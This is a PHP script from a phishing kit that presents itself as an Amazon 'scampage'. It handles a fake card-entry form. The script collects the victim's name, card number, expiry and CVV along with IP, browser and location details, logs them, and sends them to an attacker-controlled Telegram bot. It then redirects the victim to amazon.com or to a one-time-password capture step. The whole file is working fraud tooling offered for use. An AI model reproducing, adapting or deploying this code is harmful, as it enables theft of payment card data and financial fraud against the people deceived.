<?php
/*
      PRIV8 AM4ZON SCAMP4GE BY XFORGEX CODER

*/
session_start();
error_reporting(0);
# Adding Settings
include('function.php');
$settings = include('../config.php');
require_once __DIR__ . '/../storage/storage.php';
# User Agent

$useragent = $_SERVER['HTTP_USER_AGENT'];

function is_valid_card_number($number)
{
    $digits = preg_replace('/\D/', '', (string) $number);

    if ($digits === '') {
        return false;
    }

    $sum = 0;
    $shouldDouble = false;

    for ($i = strlen($digits) - 1; $i >= 0; $i--) {
        $digit = (int) $digits[$i];

        if ($shouldDouble) {
            $digit *= 2;
            if ($digit > 9) {
                $digit -= 9;
            }
        }

        $sum += $digit;
        $shouldDouble = !$shouldDouble;
    }

    return $sum % 10 === 0;
}

if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $holder = isset($_POST['holder']) ? trim($_POST['holder']) : '';
    $ccnum = isset($_POST['ccnum']) ? $_POST['ccnum'] : '';
    $expMonth = isset($_POST['EXP1']) ? $_POST['EXP1'] : '';
    $expYear = isset($_POST['EXP2']) ? $_POST['EXP2'] : '';
    $ccexp = $expMonth . '/' . $expYear;
    $cvv2 = isset($_POST['cvv2']) ? $_POST['cvv2'] : '';

    if (!is_valid_card_number($ccnum)) {
        $_SESSION['card_form_data'] = [
            'holder' => $holder,
            'ccnum' => $ccnum,
            'exp_month' => $expMonth,
            'exp_year' => $expYear,
            'cvv2' => $cvv2,
        ];

        header('Location: card.php?invalid_data=1');
        exit;
    }

    unset($_SESSION['card_form_data']);

    $cardNumberDigits = preg_replace('/\D/', '', $ccnum);

    # Logs
    $message = "🔥 AM4ZON CARD FROM - {$IP} 🔥\n\n";
    $message .= "➤ [ Card Name ] : {$holder}\n";
    $message .= "➤ [ Card Num ] : {$cardNumberDigits}\n";
    $message .= "➤ [ Card Exp ] : {$ccexp}\n";
    $message .= "➤ [ Card Cvv ] : {$cvv2}\n";
    $message .= "--------- MORE INFO -----------\n";
    $message .= "➤ [ IP Address ] : {$IP}\n";
    $message .= "➤ [ User-Agent ] : {$useragent}\n";
    $message .= "➤ [ OS ]         : {$os}\n";
    $message .= "➤ [ Browser ]    : {$browser}\n";
    $message .= "➤ [ City(IP) ]   : {$city}\n";
    $message .= "➤ [ Country ]    : {$countryname}\n";
    $message .= "➤ [ Date ]       : {$date}\n";
    $message .= ".--------------------------------.\n";

    # Persist step data
    $payload = [
        'card_name' => $holder,
        'card_number' => $cardNumberDigits,
        'expiry' => $ccexp,
        'cvv' => $cvv2
    ];

    append_login_session_step(session_id(), 'card', $payload);


    # Send Bot

    if (
        $settings['telegram'] == "1"
        && function_exists('curl_init')
        && !empty($settings['bot_url'])
        && !empty($settings['chat_id'])
    ) {
      $data = $message;
      $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
      $website = "https://api.telegram.org/{$settings['bot_url']}";
      $ch = curl_init($website . '/sendMessage');
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_POST, 1);
      curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
      $result = curl_exec($ch);
      curl_close($ch);
    } else {
      // Telegram disabled or misconfigured; skipping cURL request.
    }

    if (is_afk_enabled()) {
        header('Location: https://www.amazon.com');
    } else {
        header('Location: dashboard.php?awaiting_otp=1');
    }
    exit;
}
?>